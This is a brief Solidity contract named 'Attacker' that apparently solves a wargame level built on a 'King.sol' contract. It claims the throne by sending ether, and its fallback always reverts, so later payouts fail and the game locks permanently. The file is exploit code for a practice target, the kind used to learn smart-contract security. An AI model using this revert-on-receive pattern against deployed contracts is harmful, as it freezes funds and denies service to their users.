// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract Attacker{

  constructor(address king) public payable {
    address(king).call{value: msg.value}("");
  }

  fallback() external payable{
    revert("GAME OVER!");
  }
}
